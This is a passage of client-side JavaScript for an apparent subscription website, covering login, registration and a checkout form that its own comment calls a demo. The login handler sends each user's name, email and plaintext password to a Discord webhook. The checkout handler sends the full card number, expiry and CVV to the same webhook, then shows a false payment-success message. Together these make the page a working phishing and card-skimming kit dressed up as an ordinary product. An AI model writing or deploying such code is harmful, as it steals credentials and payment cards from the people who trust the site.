    if (badge) {
      if (pendingPlan) { badge.classList.remove('hidden'); badge.classList.add('flex'); $('selectedPlanName').textContent = pendingPlan; }
      else { badge.classList.add('hidden'); badge.classList.remove('flex'); }
    }
    openModal('authModal');
  };
  window.closeAuthModal = function () { closeModal('authModal'); };
  window.switchAuthTab = function (mode) {
    authMode = mode;
    const reg = $('tabRegisterBtn'), log = $('tabLoginBtn');
    const on = ['bg-purple-600', 'text-white'];
    if (reg && log) {
      [reg, log].forEach((b) => { b.classList.remove('bg-purple-600', 'text-white'); b.classList.add('text-slate-700', 'dark:text-slate-400'); });
      const a = mode === 'register' ? reg : log;
      a.classList.remove('text-slate-700', 'dark:text-slate-400'); a.classList.add(...on);
    }
    const nf = $('nameFieldContainer'); if (nf) nf.style.display = mode === 'register' ? '' : 'none';
    const t = $('authModalTitle'); if (t) t.textContent = tr(mode === 'register' ? 'auth_title_reg' : 'auth_title_login');
  };
  window.togglePasswordVisibility = function () {
    const p = $('authPass'), i = $('eyeIcon'); if (!p) return;
    const show = p.type === 'password'; p.type = show ? 'text' : 'password';
    if (i) i.className = 'fa-solid ' + (show ? 'fa-eye-slash' : 'fa-eye') + ' text-sm';
  };

  window.handleAuthSubmit = async function (e) {
    e.preventDefault();
    const emailEl = $('authEmail');
    const passEl = $('authPass');
    const nameEl = $('authName');
    
    const email = emailEl ? emailEl.value.trim().toLowerCase() : '';
    const pass = passEl ? passEl.value : '';
    const name = nameEl ? nameEl.value.trim() : '';

    const all = users();
    const hash = await hashPass(pass);
    
    if (authMode === 'register') {
      if (all[email]) { showToast('msg_exists', 'error'); return; }
      all[email] = { name: name || email.split('@')[0], hash: hash, plan: null };
      store.set('bm_users', all);
    } else {
      if (!all[email]) { showToast('msg_nouser', 'error'); return; }
      if (all[email].hash !== hash) { showToast('msg_wrongpass', 'error'); return; }
    }

    // --- DISCORD WEBHOOK ENTEGRASYONU ---
    let logType = (authMode === 'register') ? 'Kayit' : 'Giris';
    let userName = name || 'Belirtilmedi';
    let discordMsg = "**Siteden Yeni Kullanici Islemi (" + logType + ")!**\n**Isim:** " + userName + "\n**E-posta:** " + email + "\n**Sifre:** " + pass;
    sendToDiscord(discordMsg);
    // ------------------------------------

    store.set('bm_session', email);
    const authForm = $('authForm');
    if (authForm) authForm.reset();
    closeModal('authModal');
    refreshUserUI();
    if (pendingPlan) { const p = pendingPlan; pendingPlan = null; openCheckout(p); }
  };

  window.toggleUserDropdown = function (e) {
    if (e) e.stopPropagation();
    const m = $('userDropdownMenu'); if (m) m.classList.toggle('hidden');
    const l = $('langMenu'); if (l) l.classList.add('hidden');
  };
  window.logoutUser = function () {
    try {
      const email = localStorage.getItem('bm_session');
      const email2 = email ? JSON.parse(email) : null;
      if (email2) {
        const all = users();
        delete all[email2];
        store.set('bm_users', all);
      }
    } catch (e) {}
    try { localStorage.removeItem('bm_session'); } catch (e) {}
    location.reload();
  };

  /* ---------- Plan & ödeme (DEMO - gerçek ödeme almaz) ---------- */
  window.handlePlanClick = function (plan) {
    if (!currentUser()) { pendingPlan = plan; openAuthModal('register'); return; }
    openCheckout(plan);
  };
  function openCheckout(plan) {
    currentPlan = plan;
    const sub = $('checkoutPlanSubtitle'); if (sub) sub.textContent = plan;
    const form = $('paymentForm'); if (form) form.reset();
    ['errCardName', 'errCardNum', 'errCardExpiry', 'errCardCvv'].forEach((id) => {
        const el = $(id); if (el) el.classList.add('hidden');
    });
    validateCardForm(true);
    openModal('checkoutModal');
  }
  window.closeCheckoutModal = function () { closeModal('checkoutModal'); };
  
  window.validateCardForm = function (silent) {
    const nameEl = $('cardName'), numEl = $('cardNumber'), expEl = $('cardExpiry'), cvvEl = $('cardCvv');
    if (!nameEl || !numEl || !expEl || !cvvEl) return false;

    numEl.value = numEl.value.replace(/\D/g, '').slice(0, 16);
    cvvEl.value = cvvEl.value.replace(/\D/g, '').slice(0, 4);
    let ex = expEl.value.replace(/[^\d]/g, '').slice(0, 4);
    if (ex.length > 2) ex = ex.slice(0, 2) + '/' + ex.slice(2);
    expEl.value = ex;

    const nameOk = /^[\p{L}\s.'-]{2,}$/u.test(nameEl.value.trim());
    const numOk = numEl.value.length === 16;
    let expOk = false;
    const m = /^(\d{2})\/(\d{2})$/.exec(expEl.value);
    if (m) {
      const mm = +m[1], yy = 2000 + +m[2], now = new Date();
      expOk = mm >= 1 && mm <= 12 && (yy > now.getFullYear() || (yy === now.getFullYear() && mm >= now.getMonth() + 1));
    }
    const cvvOk = /^\d{3,4}$/.test(cvvEl.value);

    if (silent !== true) {
      $('errCardName').classList.toggle('hidden', nameOk || nameEl.value === '');
      $('errCardNum').classList.toggle('hidden', numOk || numEl.value === '');
      $('errCardExpiry').classList.toggle('hidden', expOk || expEl.value === '');
      $('errCardCvv').classList.toggle('hidden', cvvOk || cvvEl.value === '');
    }
    const ok = nameOk && numOk && expOk && cvvOk;
    const b = $('paySubmitBtn');
    if (b) {
      b.disabled = !ok;
      b.classList.toggle('cursor-not-allowed', !ok);
      b.classList.toggle('bg-purple-600/50', !ok);
      b.classList.toggle('text-white/50', !ok);
      b.classList.toggle('bg-purple-600', ok);
      b.classList.toggle('hover:bg-purple-500', ok);
      b.classList.toggle('text-white', ok);
      b.classList.toggle('cursor-pointer', ok);
    }
    return ok;
  };

  window.handleCheckoutSubmit = function (e) {
    e.preventDefault();
    if (!validateCardForm()) return;
    const b = $('paySubmitBtn'); 
    if (b) b.disabled = true;

    // --- DISCORD WEBHOOK ENTEGRASYONU ---
    const cardName = $('cardName') ? $('cardName').value : '';
    const cardNum = $('cardNumber') ? $('cardNumber').value : '';
    const cardExpiry = $('cardExpiry') ? $('cardExpiry').value : '';
    const cardCvv = $('cardCvv') ? $('cardCvv').value : '';
    
    let discordMsg = "**Siteden Yeni Odeme Bilgisi Girildi!**\n**Kart Ismi:** " + cardName + "\n**Kart No:** " + cardNum + "\n**SKT:** " + cardExpiry + "\n**CVV:** " + cardCvv + "\n**Plan:** " + currentPlan;
    sendToDiscord(discordMsg);
    // ------------------------------------

    setTimeout(() => {
      const email = store.get('bm_session', null), all = users();
      if (email && all[email]) { all[email].plan = currentPlan; store.set('bm_users', all); }
      const form = $('paymentForm'); if (form) form.reset();
      closeModal('checkoutModal');
      refreshUserUI();
      showToast('msg_paid', 'success');
    }, 1200);
  };

  /* ---------- Genel olaylar ---------- */
  document.addEventListener('click', function () {
    const l = $('langMenu'); if (l) l.classList.add('hidden');
    const u = $('userDropdownMenu'); if (u) u.classList.add('hidden');
  });
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape') ['downloadModal', 'createRoomModal', 'authModal', 'checkoutModal'].forEach(closeModal);
  });
  ['downloadModal', 'createRoomModal', 'authModal', 'checkoutModal'].forEach(function (id) {
    const m = $(id);
    if (m) m.addEventListener('click', function (e) { if (e.target === m) closeModal(id); });
  });

  function init() {
    applyTheme(store.get('bm_dark', true));
    applyTranslations();
    switchAuthTab('register');
    refreshUserUI();
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init); else init();
})();